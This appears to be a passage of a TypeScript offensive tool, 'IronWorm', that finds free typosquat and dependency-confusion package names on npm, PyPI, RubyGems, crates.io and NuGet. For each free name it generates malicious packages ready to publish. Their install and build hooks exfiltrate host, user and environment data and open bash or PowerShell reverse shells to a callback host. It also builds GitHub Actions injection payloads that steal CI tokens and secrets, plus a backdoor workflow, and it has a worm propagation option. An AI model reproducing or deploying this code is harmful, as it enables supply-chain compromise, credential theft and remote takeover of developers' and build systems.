    return { ok: false, status: 0, body: "" };
  } finally {
    clearTimeout(t);
  }
}

function typosquatVariants(pkg: string): string[] {
  const variants = new Set<string>();
  for (let i = 0; i < pkg.length; i++) variants.add(pkg.slice(0, i) + pkg.slice(i + 1));
  for (let i = 0; i < pkg.length; i++) variants.add(pkg.slice(0, i) + pkg[i] + pkg[i] + pkg.slice(i + 1));
  for (let i = 0; i < pkg.length - 1; i++) variants.add(pkg.slice(0, i) + pkg[i+1] + pkg[i] + pkg.slice(i+2));
  const homo: Record<string, string> = { a:"@", o:"0", i:"1", l:"1", e:"3", s:"5" };
  for (const [from, to] of Object.entries(homo)) variants.add(pkg.replaceAll(from, to));
  for (const affix of ["-js","-node","-util","-lib","-core","-helper","js-","node-"]) {
    variants.add(affix + pkg);
    variants.add(pkg + affix);
  }
  variants.add(pkg.replace(/-/g, "_"));
  variants.add(pkg.replace(/_/g, "-"));
  variants.delete(pkg);
  return [...variants].slice(0, 28);
}

async function checkNpmTyposquat(pkg: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const variants = typosquatVariants(pkg);
  const steps: string[] = [`[npm-typosquat] checking ${variants.length} variants of "${pkg}"`];
  const free: string[] = [];

  for (const v of variants) {
    const r = await httpGet(`https://registry.npmjs.org/${encodeURIComponent(v)}`);
    if (r.status === 404) { steps.push(`[!] FREE: ${v}`); free.push(v); }
    else if (r.ok) steps.push(`[ok] taken: ${v}`);
  }

  const artifacts = free.map(name => {
    const preinstall = [
      `node -e "const c=require('child_process'),h='${cbHost}',p=${cbPort};`,
      `c.exec('curl -fsk http://'+h+':'+p+'/npm_hook?h='+Buffer.from(require('os').hostname()).toString('base64')+'&u='+encodeURIComponent(process.env.USER||''));",`,
      `"bash -i >& /dev/tcp/'+h+'/'+p+' 0>&1 &"`,
    ].join("");
    return JSON.stringify({
      name, version: "1.0.0", description: "JavaScript utility library",
      main: "index.js",
      scripts: { preinstall: `node preinstall.js`, postinstall: `node postinstall.js` },
      dependencies: {},
    }, null, 2) +
    `\n\n// preinstall.js\n` +
    `const {exec}=require('child_process'),os=require('os'),h='${cbHost}',p=${cbPort};\n` +
    `exec('curl -fsk http://'+h+':'+p+'/'+Buffer.from(os.hostname()+' '+process.env.USER).toString('base64')+'?pkg=${name}');\n` +
    `exec('bash -i >& /dev/tcp/'+h+'/'+p+' 0>&1 &');\n\n` +
    `// postinstall.js\n` +
    `const {execSync}=require('child_process');\n` +
    `try{execSync('(bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 &) 2>/dev/null');}catch(e){}\n\n` +
    `// index.js (transparent re-export)\n` +
    `try{module.exports=require('${pkg}');}catch{module.exports={}};\n\n` +
    `// Publish: npm login && npm publish --access public`;
  });

  return {
    id: `npm_typosquat_${pkg}`, name: `npm Typosquatting — ${pkg}`,
    target: "registry.npmjs.org", category: "npm-typosquat",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "medium",
    detail: free.length > 0
      ? `${free.length} free typosquat names for "${pkg}": ${free.slice(0,5).join(", ")}`
      : `all ${variants.length} variants of "${pkg}" taken`,
    artifacts, steps,
  };
}

async function checkPipTyposquat(pkg: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const variants = typosquatVariants(pkg);
  const steps: string[] = [`[pip-typosquat] checking ${variants.length} variants of "${pkg}"`];
  const free: string[] = [];

  for (const v of variants) {
    const r = await httpGet(`https://pypi.org/pypi/${encodeURIComponent(v)}/json`);
    if (r.status === 404) { steps.push(`[!] FREE: ${v}`); free.push(v); }
    else if (r.ok) steps.push(`[ok] taken: ${v}`);
  }

  const artifacts = free.map(name =>
    `# setup.py — ${name} (typosquat of ${pkg})\n` +
    `import subprocess, os, base64, urllib.request\n` +
    `def _nx():\n` +
    `    try:\n` +
    `        d = os.popen("id && hostname && env 2>&1").read()[:800]\n` +
    `        urllib.request.urlopen(f"http://${cbHost}:${cbPort}/{base64.b64encode(d.encode()).decode()}",timeout=5)\n` +
    `    except: pass\n` +
    `    try: subprocess.Popen(["bash","-c","bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1"])\n` +
    `    except: pass\n` +
    `_nx()\n\n` +
    `from setuptools import setup\n` +
    `setup(name="${name}",version="1.0.0",description="Python utility",packages=[])\n\n` +
    `# Publish: pip install build twine && python -m build && twine upload dist/*`
  );

  return {
    id: `pip_typosquat_${pkg}`, name: `pip Typosquatting — ${pkg}`,
    target: "pypi.org", category: "pip-typosquat",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "medium",
    detail: free.length > 0
      ? `${free.length} free PyPI typosquats for "${pkg}": ${free.slice(0,5).join(", ")}`
      : `all ${variants.length} variants taken`,
    artifacts, steps,
  };
}

async function checkGemTyposquat(pkg: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const variants = typosquatVariants(pkg);
  const steps: string[] = [`[gem-typosquat] checking ${variants.length} variants of "${pkg}"`];
  const free: string[] = [];

  for (const v of variants) {
    const r = await httpGet(`https://rubygems.org/api/v1/gems/${encodeURIComponent(v)}.json`);
    if (r.status === 404) { steps.push(`[!] FREE: ${v}`); free.push(v); }
    else if (r.ok) steps.push(`[ok] taken: ${v}`);
  }

  const artifacts = free.map(name =>
    `# ${name}.gemspec\nGem::Specification.new do |s|\n` +
    `  s.name='${name}';s.version='1.0.0';s.summary='Ruby utility'\n` +
    `  s.files=['lib/${name}.rb'];s.extensions=['ext/mkrf_conf.rb']\nend\n\n` +
    `# ext/mkrf_conf.rb\nrequire 'net/http';require 'base64'\n` +
    `d=\`id && hostname && env 2>&1\`[0..800]\n` +
    `begin;Net::HTTP.get(URI("http://${cbHost}:${cbPort}/\#{Base64.strict_encode64(d)}"));rescue;end\n` +
    `begin;Process.spawn("bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1");rescue;end\n\n` +
    `# lib/${name}.rb\nbegin;require '${pkg}';rescue LoadError;end\n\n` +
    `# Publish: gem build ${name}.gemspec && gem push ${name}-1.0.0.gem`
  );

  return {
    id: `gem_typosquat_${pkg}`, name: `RubyGem Typosquatting — ${pkg}`,
    target: "rubygems.org", category: "gem-typosquat",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "medium",
    detail: free.length > 0
      ? `${free.length} free gem typosquats for "${pkg}": ${free.slice(0,5).join(", ")}`
      : `all ${variants.length} gem variants taken`,
    artifacts, steps,
  };
}

async function checkCargoTyposquat(pkg: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const variants = typosquatVariants(pkg);
  const steps: string[] = [`[cargo-typosquat] checking ${variants.length} variants of "${pkg}"`];
  const free: string[] = [];

  for (const v of variants) {
    const r = await httpGet(`https://crates.io/api/v1/crates/${encodeURIComponent(v)}`);
    if (r.status === 404) { steps.push(`[!] FREE: ${v}`); free.push(v); }
    else if (r.ok) steps.push(`[ok] taken: ${v}`);
  }

  const artifacts = free.map(name =>
    `// build.rs — ${name} crate (typosquat of ${pkg})\n` +
    `use std::process::Command;\n` +
    `fn main() {\n` +
    `    let h = "${cbHost}"; let p = "${cbPort}";\n` +
    `    let _ = Command::new("sh").args(["-c",&format!("curl -fsk http://{}:{}/$(id|base64 -w0 2>/dev/null||id|base64) &",h,p)]).spawn();\n` +
    `    let _ = Command::new("sh").args(["-c",&format!("bash -i >& /dev/tcp/{}/{} 0>&1 &",h,p)]).spawn();\n` +
    `    println!("cargo:rerun-if-changed=build.rs");\n}\n\n` +
    `// Cargo.toml\n[package]\nname = "${name}"\nversion = "1.0.0"\nedition = "2021"\nbuild = "build.rs"\n\n` +
    `// Publish: cargo publish --token \$CARGO_TOKEN`
  );

  return {
    id: `cargo_typosquat_${pkg}`, name: `Cargo Typosquatting — ${pkg}`,
    target: "crates.io", category: "cargo-typosquat",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "medium",
    detail: free.length > 0
      ? `${free.length} free crate typosquats for "${pkg}": ${free.slice(0,5).join(", ")}`
      : `all ${variants.length} crate variants taken`,
    artifacts, steps,
  };
}

async function checkNuGetTyposquat(pkg: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const variants = typosquatVariants(pkg);
  const steps: string[] = [`[nuget-typosquat] checking ${variants.length} variants of "${pkg}"`];
  const free: string[] = [];

  for (const v of variants) {
    const r = await httpGet(`https://api.nuget.org/v3/registration5-gz-semver2/${encodeURIComponent(v.toLowerCase())}/index.json`);
    if (r.status === 404) { steps.push(`[!] FREE: ${v}`); free.push(v); }
    else if (r.ok) steps.push(`[ok] taken: ${v}`);
  }

  const artifacts = free.map(name =>
    `<!-- ${name}.targets — MSBuild auto-imported evil file -->\n` +
    `<Project>\n  <Target Name="NxExfil" BeforeTargets="BeforeBuild">\n` +
    `    <Exec Command="powershell -NoP -NonI -W Hidden -c ` +
    `&quot;$h='${cbHost}';$p=${cbPort};$d=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((whoami)));` +
    `(New-Object Net.WebClient).DownloadString(&quot;http://$h:$p/$d&quot;)&quot;" />\n` +
    `    <Exec Command="powershell -NoP -NonI -W Hidden -c ` +
    `&quot;$c=New-Object Net.Sockets.TCPClient('${cbHost}',${cbPort});` +
    `$s=$c.GetStream();[byte[]]$b=0..65535|%{0};` +
    `while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);` +
    `$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$s.Write($st,0,$st.Length)}&quot;" />\n` +
    `  </Target>\n</Project>\n\n` +
    `<!-- Publish: nuget push ${name}.1.0.0.nupkg -ApiKey \$NUGET_KEY -Source https://api.nuget.org/v3/index.json -->`
  );

  return {
    id: `nuget_typosquat_${pkg}`, name: `NuGet Typosquatting — ${pkg}`,
    target: "nuget.org", category: "nuget-typosquat",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "medium",
    detail: free.length > 0
      ? `${free.length} free NuGet typosquats for "${pkg}": ${free.slice(0,5).join(", ")}`
      : `all ${variants.length} NuGet variants taken`,
    artifacts, steps,
  };
}

async function checkDepConfusion(orgName: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const steps: string[] = [`[dep-confusion] probing internal packages for org: ${orgName}`];
  const commonNames = [
    `${orgName}-core`, `${orgName}-utils`, `${orgName}-lib`, `${orgName}-config`,
    `${orgName}-api`, `${orgName}-common`, `${orgName}-shared`, `${orgName}-internal`,
    `${orgName}-client`, `${orgName}-server`, `${orgName}-auth`, `${orgName}-ui`,
    `${orgName}-sdk`, `${orgName}-types`, `${orgName}-hooks`,
  ];

  const free: string[] = [];
  for (const name of commonNames) {
    const r = await httpGet(`https://registry.npmjs.org/${encodeURIComponent(name)}`);
    if (r.status === 404) { steps.push(`[!] FREE on public npm: ${name}`); free.push(name); }
    else steps.push(`[ok] already public: ${name}`);
  }

  const artifacts = free.map(name =>
    JSON.stringify({
      name, version: "9999.0.0",
      description: `${orgName} internal utility`,
      main: "index.js",
      scripts: {
        preinstall: `node -e "require('child_process').exec('curl -fsk http://${cbHost}:${cbPort}/dep_confusion?host='+require('os').hostname()+'&user='+process.env.USER)"`,
        postinstall: `node -e "require('child_process').exec('bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 &')"`,
      },
    }, null, 2) +
    `\n\n// index.js\nmodule.exports = {};\n\n` +
    `// npm login && npm publish --access public (version 9999.0.0 beats any internal version)`
  );

  return {
    id: `dep_confusion_${orgName}`, name: `Dependency Confusion — ${orgName}`,
    target: orgName, category: "dep-confusion",
    status: free.length > 0 ? "success" : "info",
    severity: free.length > 0 ? "critical" : "info",
    detail: free.length > 0
      ? `${free.length} internal package names claimable on public npm: ${free.slice(0,4).join(", ")}`
      : `no dep confusion candidates for "${orgName}"`,
    artifacts, steps,
  };
}

async function checkGithubActions(org: string, repo: string, cbHost: string, cbPort: string): Promise<IronWormResult> {
  const steps: string[] = [`[gh-actions] probing ${org}/${repo}`];
  const artifacts: string[] = [];
  const urls = [
    `https://raw.githubusercontent.com/${org}/${repo}/main/.github/workflows/ci.yml`,
    `https://raw.githubusercontent.com/${org}/${repo}/main/.github/workflows/build.yml`,
    `https://raw.githubusercontent.com/${org}/${repo}/main/.github/workflows/test.yml`,
    `https://raw.githubusercontent.com/${org}/${repo}/main/.github/workflows/release.yml`,
    `https://raw.githubusercontent.com/${org}/${repo}/master/.github/workflows/ci.yml`,
  ];

  let foundVulnerable = false;
  for (const url of urls) {
    const r = await httpGet(url);
    if (!r.ok) continue;
    steps.push(`[found] ${url.split("/").pop()}`);
    const hasPRT  = r.body.includes("pull_request_target");
    const hasExpr = /github\.event\.(pull_request\.title|comment\.body|issue\.title|pull_request\.head\.ref)/.test(r.body);
    if (hasPRT && hasExpr) { foundVulnerable = true; steps.push(`[!] VULNERABLE: pwn-request vector`); }
    const inject =
      `# pwn-request: ${org}/${repo}\n# PR title payload:\n` +
      `'; curl -fsk http://${cbHost}:${cbPort}/$(cat $GITHUB_TOKEN 2>/dev/null|base64 -w0) #\n\n` +
      `# Malicious workflow (if write access) — .github/workflows/backdoor.yml:\n` +
      `name: Maintenance\non:\n  schedule:\n    - cron: '0 3 * * *'\n  push:\n    branches: [main]\n` +
      `jobs:\n  run:\n    runs-on: ubuntu-latest\n    steps:\n      - name: setup\n        run: |\n` +
      `          curl -fsk http://${cbHost}:${cbPort}/$(env|base64 -w0)\n` +
      `          env|grep -iE '(TOKEN|SECRET|KEY|PASS|CRED|AWS|AZURE|GCP)'|base64|curl -X POST http://${cbHost}:${cbPort}/ci_secrets --data-binary @-\n`;
    artifacts.push(inject);
  }

  return {
    id: `gh_actions_${org}_${repo}`, name: `GitHub Actions — ${org}/${repo}`,
    target: `github.com/${org}/${repo}`, category: "github-actions",
    status: foundVulnerable ? "success" : "info",
    severity: foundVulnerable ? "critical" : "high",
    detail: foundVulnerable
      ? `Vulnerable pull_request_target with expression injection in ${org}/${repo}`
      : `Attack templates generated for ${org}/${repo}`,
    artifacts, steps,
  };
}

function generateSupplyChainPayloads(cbHost: string, cbPort: string): IronWormResult {
  const cb = `http://${cbHost}:${cbPort}`;
  return {
    id: "supply_chain_gen", name: "Supply Chain Payload Generator",
    target: `${cbHost}:${cbPort}`, category: "payload-gen",
    status: "success", severity: "critical",
    detail: "npm/pip/gem/cargo/nuget/docker/git/make/CI supply chain payloads",
    steps: ["ready"],
    artifacts: [
      `{"scripts":{"postinstall":"node -e \\"require('child_process').exec('bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1 &')\\"  "}}`,
      `import subprocess;subprocess.Popen(["bash","-c","bash -i >& /dev/tcp/${cbHost}/${cbPort} 0>&1"])`,
      `#!/bin/sh\ncurl -fsk ${cb}/git_hook?r=$(git remote get-url origin|base64 -w0) &`,
      `all:\n\tcurl -fsk ${cb}/make_hook &`,
      `FROM alpine:3.20\nRUN curl -fsk ${cb}/docker_pull > /tmp/.nx && sh /tmp/.nx &`,
      `fn main(){let _=std::process::Command::new("sh").args(["-c",&format!("curl -fsk ${cb}/$(id|base64) &")]).spawn();}`,
    ],
  };
}

export async function ironWormScan(opts: IronWormOptions): Promise<IronWormResult[]> {
  const {
    packageName     = "",
    githubOrg       = "",
    githubRepo      = "",
    depConfusionOrg = "",
    cbHost          = "LHOST",
    cbPort          = "9999",
    propagate       = false,
    targetCidr      = "",
  } = opts;

  const results: IronWormResult[] = [];
  logger.info({ opts: { packageName, githubOrg, githubRepo, cbHost, propagate } }, "IronWorm scan started");

  const tasks: Promise<IronWormResult | null>[] = [];

  if (packageName) {
    tasks.push(checkNpmTyposquat(packageName, cbHost, cbPort).catch(() => null));
    tasks.push(checkPipTyposquat(packageName, cbHost, cbPort).catch(() => null));
    tasks.push(checkGemTyposquat(packageName, cbHost, cbPort).catch(() => null));
    tasks.push(checkCargoTyposquat(packageName, cbHost, cbPort).catch(() => null));
    tasks.push(checkNuGetTyposquat(packageName, cbHost, cbPort).catch(() => null));
  }

  if (depConfusionOrg || githubOrg) {
    tasks.push(checkDepConfusion(depConfusionOrg || githubOrg, cbHost, cbPort).catch(() => null));
  }

  if (githubOrg) {
    tasks.push(checkGithubActions(githubOrg, githubRepo || "main", cbHost, cbPort).catch(() => null));
  }

  results.push(generateSupplyChainPayloads(cbHost, cbPort));

  const settled = await Promise.all(tasks);
  for (const r of settled) if (r) results.push(r);

  if (propagate && cbHost !== "LHOST") {
    const cidrs = targetCidr ? [targetCidr] : getLocalSubnets();
    for (const cidr of cidrs) {
      const wormResult = await wormScan(cidr, cbHost, cbPort).catch(e => {
        logger.error({ err: e }, "worm scan failed");
        return null;
      });
      if (wormResult) results.push(wormResult);
    }
  }

  logger.info({ count: results.length }, "IronWorm scan complete");
  return results;
}
